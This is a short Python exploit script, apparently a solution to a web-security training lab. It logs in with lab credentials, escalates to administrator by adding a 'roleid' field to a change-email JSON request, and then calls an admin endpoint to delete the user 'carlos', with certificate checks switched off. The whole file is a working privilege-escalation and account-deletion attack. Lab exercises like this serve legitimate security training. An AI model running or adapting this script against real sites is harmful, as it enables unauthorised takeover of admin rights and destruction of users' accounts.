import requests
import sys
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def delete_user(seession , url):
    login_url = url +"/login"
    data = {
        "username":"wiener",
        "password":"peter"
    }

    print("(+) Attempting to login..[👀]")
    r = seession.post(login_url, data=data ,verify=False)
    if "Log out" in r.text:
        print("(+) Login Successfully [😎]")
    else:
        print("(-) Login Failed [🙄]")
        sys.exit(-1)
    print("(+) Exploiting [💣] vulnerability....")
    change_email = url +"/my-account/change-email"
    request_data = {
        "email":"csrf@csrf.com",
         "roleid":2
         
    }
    r = seession.post(change_email, json=request_data , verify=False)
    if "Admin" in r.text:
        print("(+) Exploited [☠️]")
    else:
        print("(-) Exploiting failed")
    print("(+) Deleting Carlos Account..[✌️]")
    delete_carlos = url+"/admin/delete?username=carlos"
    r = seession.get(delete_carlos, verify=False)
    if r.status_code ==200:
        print("(+) Account deleted successfully")
    else:
        print("(-) Failed to delete account.")



def main():
    if len(sys.argv) !=2:
        print("(🛠️) Usage: %s <url>"% sys.argv[0])
        print("(👉) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    session = requests.Session()
    delete_user(session,url)




if __name__ =="__main__":
    main()